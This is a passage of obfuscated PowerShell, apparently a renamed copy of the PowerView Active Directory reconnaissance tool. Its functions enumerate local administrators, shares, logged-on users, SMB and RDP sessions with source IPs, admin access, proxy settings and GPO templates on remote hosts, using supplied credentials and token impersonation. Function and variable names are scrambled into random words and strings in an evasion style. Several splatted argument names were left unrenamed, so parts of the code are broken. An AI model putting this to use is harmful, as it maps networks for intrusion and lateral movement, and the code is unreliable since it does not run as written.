            $nlvvSWoK99['Domain'] = $JXWXuoyG99
            $lCBnsyFH99['Domain'] = $JXWXuoyG99
        }

        if ($UvnpvCNS99 -eq 'All') {
            $nlvvSWoK99['Identity'] = '*'
        }
        elseif ($UvnpvCNS99 -eq 'Domain') {
            $nlvvSWoK99['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($UvnpvCNS99 -eq 'DomainController') -or ($UvnpvCNS99 -eq 'DC')) {
            $nlvvSWoK99['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $nlvvSWoK99['Identity'] = $UvnpvCNS99
        }

        $WvjkRzBk99 = straights @SearcherArguments

        ForEach ($GPO in $WvjkRzBk99) {
            $RSiSIwpM99 = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            $rYDqVpFt99 =  @{
                'GptTmplPath' = $RSiSIwpM99
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $rYDqVpFt99['Credential'] = $tYWiEqAT99 }

            Casandra @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}



function entwines {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = $Env:COMPUTERNAME,

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $BXxAvYPV99 = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            if ($BXxAvYPV99 -eq 'API') {

                $kxMbJaNs99 = 1
                $sTvnYjdq99 = [IntPtr]::Zero
                $ICdKLAIx99 = 0
                $HpizxLoP99 = 0
                $NRazKeIU99 = 0

                $uBmcbTpF99 = $VTuALOfG99::NetLocalGroupEnum($BoJggNks99, $kxMbJaNs99, [ref]$sTvnYjdq99, -1, [ref]$ICdKLAIx99, [ref]$HpizxLoP99, [ref]$NRazKeIU99)

                $ZdQQYlky99 = $sTvnYjdq99.ToInt64()

                if (($uBmcbTpF99 -eq 0) -and ($ZdQQYlky99 -gt 0)) {

                    $OKZOkhSi99 = $nMUiwiWi99::GetSize()

                    for ($i = 0; ($i -lt $ICdKLAIx99); $i++) {
                        $fpakwlHf99 = New-Object System.Intptr -ArgumentList $ZdQQYlky99
                        $Info = $fpakwlHf99 -as $nMUiwiWi99

                        $ZdQQYlky99 = $fpakwlHf99.ToInt64()
                        $ZdQQYlky99 += $OKZOkhSi99

                        $MSSeuaLN99 = New-Object PSObject
                        $MSSeuaLN99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                        $MSSeuaLN99 | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $MSSeuaLN99 | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $MSSeuaLN99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $MSSeuaLN99
                    }
                    $Null = $VTuALOfG99::NetApiBufferFree($sTvnYjdq99)
                }
                else {
                    Write-Verbose "[entwines] Error: $(([ComponentModel.Win32Exception] $uBmcbTpF99).Message)"
                }
            }
            else {
                $GtRlRnGK99 = [ADSI]"WinNT://$BoJggNks99,computer"

                $GtRlRnGK99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $MSSeuaLN99 = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                    $Group | Add-Member Noteproperty 'GroupName' ($MSSeuaLN99.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($MSSeuaLN99.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($MSSeuaLN99.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function inefficient {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = $Env:COMPUTERNAME,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $owBLZLPg99 = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $BXxAvYPV99 = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            if ($BXxAvYPV99 -eq 'API') {

                $kxMbJaNs99 = 2
                $sTvnYjdq99 = [IntPtr]::Zero
                $ICdKLAIx99 = 0
                $HpizxLoP99 = 0
                $NRazKeIU99 = 0

                $uBmcbTpF99 = $VTuALOfG99::NetLocalGroupGetMembers($BoJggNks99, $owBLZLPg99, $kxMbJaNs99, [ref]$sTvnYjdq99, -1, [ref]$ICdKLAIx99, [ref]$HpizxLoP99, [ref]$NRazKeIU99)

                $ZdQQYlky99 = $sTvnYjdq99.ToInt64()

                $yQCTDBqh99 = @()

                if (($uBmcbTpF99 -eq 0) -and ($ZdQQYlky99 -gt 0)) {

                    $OKZOkhSi99 = $MuknoUJB99::GetSize()

                    for ($i = 0; ($i -lt $ICdKLAIx99); $i++) {
                        $fpakwlHf99 = New-Object System.Intptr -ArgumentList $ZdQQYlky99
                        $Info = $fpakwlHf99 -as $MuknoUJB99

                        $ZdQQYlky99 = $fpakwlHf99.ToInt64()
                        $ZdQQYlky99 += $OKZOkhSi99

                        $KnFFkPnm99 = ''
                        $VRDItCNH99 = $CtIsAwlU99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$KnFFkPnm99);$gFfKoNOj99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($VRDItCNH99 -eq 0) {
                            Write-Verbose "[inefficient] Error: $(([ComponentModel.Win32Exception] $gFfKoNOj99).Message)"
                        }
                        else {
                            $VoXrAEUj99 = New-Object PSObject
                            $VoXrAEUj99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                            $VoXrAEUj99 | Add-Member Noteproperty 'GroupName' $owBLZLPg99
                            $VoXrAEUj99 | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $VoXrAEUj99 | Add-Member Noteproperty 'SID' $KnFFkPnm99
                            $hojuGiPZ99 = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $VoXrAEUj99 | Add-Member Noteproperty 'IsGroup' $hojuGiPZ99
                            $VoXrAEUj99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $yQCTDBqh99 += $VoXrAEUj99
                        }
                    }

                    $Null = $VTuALOfG99::NetApiBufferFree($sTvnYjdq99)

                    $FPhEGxjp99 = $yQCTDBqh99 | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($FPhEGxjp99) {
                        $FPhEGxjp99 = $FPhEGxjp99.Substring(0, $FPhEGxjp99.LastIndexOf('-'))

                        $yQCTDBqh99 | ForEach-Object {
                            if ($_.SID -match $FPhEGxjp99) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $yQCTDBqh99 | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $yQCTDBqh99
                }
                else {
                    Write-Verbose "[inefficient] Error: $(([ComponentModel.Win32Exception] $uBmcbTpF99).Message)"
                }
            }
            else {
                try {
                    $hutEEtXc99 = [ADSI]"WinNT://$BoJggNks99/$owBLZLPg99,group"

                    $hutEEtXc99.psbase.Invoke('Members') | ForEach-Object {

                        $VoXrAEUj99 = New-Object PSObject
                        $VoXrAEUj99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                        $VoXrAEUj99 | Add-Member Noteproperty 'GroupName' $owBLZLPg99

                        $LsdYEpOW99 = ([ADSI]$_)
                        $DyOUczpI99 = $LsdYEpOW99.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $hojuGiPZ99 = ($LsdYEpOW99.SchemaClassName -like 'group')

                        if(([regex]::Matches($DyOUczpI99, '/')).count -eq 1) {
                            $ETPoUcLi99 = $True
                            $Name = $DyOUczpI99.Replace('/', '\')
                        }
                        else {
                            $ETPoUcLi99 = $False
                            $Name = $DyOUczpI99.Substring($DyOUczpI99.IndexOf('/')+1).Replace('/', '\')
                        }

                        $VoXrAEUj99 | Add-Member Noteproperty 'AccountName' $Name
                        $VoXrAEUj99 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LsdYEpOW99.InvokeGet('ObjectSID'),0)).Value)
                        $VoXrAEUj99 | Add-Member Noteproperty 'IsGroup' $hojuGiPZ99
                        $VoXrAEUj99 | Add-Member Noteproperty 'IsDomain' $ETPoUcLi99




                        $VoXrAEUj99
                    }
                }
                catch {
                    Write-Verbose "[inefficient] Error for $BoJggNks99 : $_"
                }
            }
        }
    }
    
    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function publication {

    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            $kxMbJaNs99 = 1
            $sTvnYjdq99 = [IntPtr]::Zero
            $ICdKLAIx99 = 0
            $HpizxLoP99 = 0
            $NRazKeIU99 = 0

            $uBmcbTpF99 = $VTuALOfG99::NetShareEnum($BoJggNks99, $kxMbJaNs99, [ref]$sTvnYjdq99, -1, [ref]$ICdKLAIx99, [ref]$HpizxLoP99, [ref]$NRazKeIU99)

            $ZdQQYlky99 = $sTvnYjdq99.ToInt64()

            if (($uBmcbTpF99 -eq 0) -and ($ZdQQYlky99 -gt 0)) {

                $OKZOkhSi99 = $SkPFhvFy99::GetSize()

                for ($i = 0; ($i -lt $ICdKLAIx99); $i++) {
                    $fpakwlHf99 = New-Object System.Intptr -ArgumentList $ZdQQYlky99
                    $Info = $fpakwlHf99 -as $SkPFhvFy99

                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $ZdQQYlky99 = $fpakwlHf99.ToInt64()
                    $ZdQQYlky99 += $OKZOkhSi99
                    $Share
                }

                $Null = $VTuALOfG99::NetApiBufferFree($sTvnYjdq99)
            }
            else {
                Write-Verbose "[publication] Error: $(([ComponentModel.Win32Exception] $uBmcbTpF99).Message)"
            }
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function pawnshops {

    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            $kxMbJaNs99 = 1
            $sTvnYjdq99 = [IntPtr]::Zero
            $ICdKLAIx99 = 0
            $HpizxLoP99 = 0
            $NRazKeIU99 = 0

            $uBmcbTpF99 = $VTuALOfG99::NetWkstaUserEnum($BoJggNks99, $kxMbJaNs99, [ref]$sTvnYjdq99, -1, [ref]$ICdKLAIx99, [ref]$HpizxLoP99, [ref]$NRazKeIU99)

            $ZdQQYlky99 = $sTvnYjdq99.ToInt64()

            if (($uBmcbTpF99 -eq 0) -and ($ZdQQYlky99 -gt 0)) {

                $OKZOkhSi99 = $RnTAeUrd99::GetSize()

                for ($i = 0; ($i -lt $ICdKLAIx99); $i++) {
                    $fpakwlHf99 = New-Object System.Intptr -ArgumentList $ZdQQYlky99
                    $Info = $fpakwlHf99 -as $RnTAeUrd99

                    $vmVaJJUj99 = $Info | Select-Object *
                    $vmVaJJUj99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                    $vmVaJJUj99.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $ZdQQYlky99 = $fpakwlHf99.ToInt64()
                    $ZdQQYlky99 += $OKZOkhSi99
                    $vmVaJJUj99
                }

                $Null = $VTuALOfG99::NetApiBufferFree($sTvnYjdq99)
            }
            else {
                Write-Verbose "[pawnshops] Error: $(([ComponentModel.Win32Exception] $uBmcbTpF99).Message)"
            }
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function Letha {

    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            $kxMbJaNs99 = 10
            $sTvnYjdq99 = [IntPtr]::Zero
            $ICdKLAIx99 = 0
            $HpizxLoP99 = 0
            $NRazKeIU99 = 0

            $uBmcbTpF99 = $VTuALOfG99::NetSessionEnum($BoJggNks99, '', $OvZZajfU99, $kxMbJaNs99, [ref]$sTvnYjdq99, -1, [ref]$ICdKLAIx99, [ref]$HpizxLoP99, [ref]$NRazKeIU99)

            $ZdQQYlky99 = $sTvnYjdq99.ToInt64()

            if (($uBmcbTpF99 -eq 0) -and ($ZdQQYlky99 -gt 0)) {

                $OKZOkhSi99 = $eiveVGBF99::GetSize()

                for ($i = 0; ($i -lt $ICdKLAIx99); $i++) {
                    $fpakwlHf99 = New-Object System.Intptr -ArgumentList $ZdQQYlky99
                    $Info = $fpakwlHf99 -as $eiveVGBF99

                    $YbCYQFsZ99 = $Info | Select-Object *
                    $YbCYQFsZ99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                    $YbCYQFsZ99.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $ZdQQYlky99 = $fpakwlHf99.ToInt64()
                    $ZdQQYlky99 += $OKZOkhSi99
                    $YbCYQFsZ99
                }

                $Null = $VTuALOfG99::NetApiBufferFree($sTvnYjdq99)
            }
            else {
                Write-Verbose "[Letha] Error: $(([ComponentModel.Win32Exception] $uBmcbTpF99).Message)"
            }
        }
    }


    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function prosaic {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost'
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$tdrFALUN99")

                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $OvZZajfU99 = recollection -ObjectSID $_ -OutputType 'DomainSimple'

                    if ($OvZZajfU99) {
                        $OvZZajfU99, $thGIxDFy99 = $OvZZajfU99.Split('@')
                    }
                    else {
                        $OvZZajfU99 = $_
                        $thGIxDFy99 = $Null
                    }

                    $qbnrxrCt99 = New-Object PSObject
                    $qbnrxrCt99 | Add-Member Noteproperty 'ComputerName' "$tdrFALUN99"
                    $qbnrxrCt99 | Add-Member Noteproperty 'UserDomain' $thGIxDFy99
                    $qbnrxrCt99 | Add-Member Noteproperty 'UserName' $OvZZajfU99
                    $qbnrxrCt99 | Add-Member Noteproperty 'UserSID' $_
                    $qbnrxrCt99.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $qbnrxrCt99
                }
            }
            catch {
                Write-Verbose "[prosaic] Error opening remote registry on '$tdrFALUN99' : $_"
            }
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function ejaculated {

    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {

            $OukPpoyL99 = $loOogVRL99::WTSOpenServerEx($BoJggNks99)

            if ($OukPpoyL99 -ne 0) {

                $CPlfUrFo99 = [IntPtr]::Zero
                $HxQmJNus99 = 0

                $uBmcbTpF99 = $loOogVRL99::WTSEnumerateSessionsEx($OukPpoyL99, [ref]1, 0, [ref]$CPlfUrFo99, [ref]$HxQmJNus99);$gFfKoNOj99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                $ZdQQYlky99 = $CPlfUrFo99.ToInt64()

                if (($uBmcbTpF99 -ne 0) -and ($ZdQQYlky99 -gt 0)) {

                    $OKZOkhSi99 = $uLTIZBMd99::GetSize()

                    for ($i = 0; ($i -lt $HxQmJNus99); $i++) {

                        $fpakwlHf99 = New-Object System.Intptr -ArgumentList $ZdQQYlky99
                        $Info = $fpakwlHf99 -as $uLTIZBMd99

                        $bSGlkjFP99 = New-Object PSObject

                        if ($Info.pHostName) {
                            $bSGlkjFP99 | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            $bSGlkjFP99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                        }

                        $bSGlkjFP99 | Add-Member Noteproperty 'SessionName' $Info.pSessionName

                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $bSGlkjFP99 | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $bSGlkjFP99 | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }

                        $bSGlkjFP99 | Add-Member Noteproperty 'ID' $Info.SessionID
                        $bSGlkjFP99 | Add-Member Noteproperty 'State' $Info.State

                        $eDjEocZE99 = [IntPtr]::Zero
                        $ICuVVzPP99 = 0

                        $VRDItCNH99 = $loOogVRL99::WTSQuerySessionInformation($OukPpoyL99, $Info.SessionID, 14, [ref]$eDjEocZE99, [ref]$ICuVVzPP99);$sZfMclPl99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if ($VRDItCNH99 -eq 0) {
                            Write-Verbose "[ejaculated] Error: $(([ComponentModel.Win32Exception] $sZfMclPl99).Message)"
                        }
                        else {
                            $HQfnMnKB99 = $eDjEocZE99.ToInt64()
                            $ajxGAwsa99 = New-Object System.Intptr -ArgumentList $HQfnMnKB99
                            $Info2 = $ajxGAwsa99 -as $xthshAam99

                            $sSXoVBeO99 = $Info2.Address
                            if ($sSXoVBeO99[2] -ne 0) {
                                $sSXoVBeO99 = [String]$sSXoVBeO99[2]+'.'+[String]$sSXoVBeO99[3]+'.'+[String]$sSXoVBeO99[4]+'.'+[String]$sSXoVBeO99[5]
                            }
                            else {
                                $sSXoVBeO99 = $Null
                            }

                            $bSGlkjFP99 | Add-Member Noteproperty 'SourceIP' $sSXoVBeO99
                            $bSGlkjFP99.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $bSGlkjFP99

                            $Null = $loOogVRL99::WTSFreeMemory($eDjEocZE99)

                            $ZdQQYlky99 += $OKZOkhSi99
                        }
                    }
                    $Null = $loOogVRL99::WTSFreeMemoryEx(2, $CPlfUrFo99, $HxQmJNus99)
                }
                else {
                    Write-Verbose "[ejaculated] Error: $(([ComponentModel.Win32Exception] $gFfKoNOj99).Message)"
                }
                $Null = $loOogVRL99::WTSCloseServer($OukPpoyL99)
            }
            else {
                Write-Verbose "[ejaculated] Error opening the Remote Desktop Session Host (RD Session Host) server for: $tdrFALUN99"
            }
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function appreciates {

    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            $OukPpoyL99 = $CtIsAwlU99::OpenSCManagerW("\\$BoJggNks99", 'ServicesActive', 0xF003F);$gFfKoNOj99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            $uNzgxJBS99 = New-Object PSObject
            $uNzgxJBS99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99

            if ($OukPpoyL99 -ne 0) {
                $Null = $CtIsAwlU99::CloseServiceHandle($OukPpoyL99)
                $uNzgxJBS99 | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[appreciates] Error: $(([ComponentModel.Win32Exception] $gFfKoNOj99).Message)"
                $uNzgxJBS99 | Add-Member Noteproperty 'IsAdmin' $False
            }
            $uNzgxJBS99.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $uNzgxJBS99
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function slobbering {

    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $KqozIDmd99 = privets -Credential $tYWiEqAT99
        }
    }

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            if ($BoJggNks99 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $raAkILNI99 = $BoJggNks99
                $BoJggNks99 = [System.Net.Dns]::GetHostByAddress($BoJggNks99) | Select-Object -ExpandProperty HostName
            }
            else {
                $raAkILNI99 = @(bootstrap -ComputerName $BoJggNks99)[0].IPAddress
            }

            $sTvnYjdq99 = [IntPtr]::Zero

            $uBmcbTpF99 = $VTuALOfG99::DsGetSiteName($BoJggNks99, [ref]$sTvnYjdq99)

            $DDrSCjUA99 = New-Object PSObject
            $DDrSCjUA99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
            $DDrSCjUA99 | Add-Member Noteproperty 'IPAddress' $raAkILNI99

            if ($uBmcbTpF99 -eq 0) {
                $UHxOuyqA99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($sTvnYjdq99)
                $DDrSCjUA99 | Add-Member Noteproperty 'SiteName' $UHxOuyqA99
            }
            else {
                Write-Verbose "[slobbering] Error: $(([ComponentModel.Win32Exception] $uBmcbTpF99).Message)"
                $DDrSCjUA99 | Add-Member Noteproperty 'SiteName' ''
            }
            $DDrSCjUA99.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')

            $Null = $VTuALOfG99::NetApiBufferFree($sTvnYjdq99)

            $DDrSCjUA99
        }
    }

    END {
        if ($KqozIDmd99) {
            potato -TokenHandle $KqozIDmd99
        }
    }
}


function transgressors {

    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            try {
                $oKMRUpSN99 = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $BoJggNks99
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $oKMRUpSN99['Credential'] = $tYWiEqAT99 }

                $IBdufakX99 = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'

                $HKCU = 2147483649
                $QFLUNyde99 = $IBdufakX99.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $mktqpRCu99 = $IBdufakX99.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue

                $Wpad = ''
                if ($mktqpRCu99 -and ($mktqpRCu99 -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($mktqpRCu99)
                    }
                    catch {
                        Write-Warning "[transgressors] Error connecting to AutoConfigURL : $mktqpRCu99"
                    }
                }

                if ($QFLUNyde99 -or $mktqpRCu99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                    $Out | Add-Member Noteproperty 'ProxyServer' $QFLUNyde99
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $mktqpRCu99
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[transgressors] No proxy settings found for $tdrFALUN99"
                }
            }
            catch {
                Write-Warning "[transgressors] Error enumerating proxy settings for $tdrFALUN99 : $_"
            }
        }
    }
}


function straightest {

    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            $HKLM = 2147483650

            $oKMRUpSN99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $BoJggNks99
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $oKMRUpSN99['Credential'] = $tYWiEqAT99 }

            try {
                $Reg = Get-WmiObject @WmiArguments

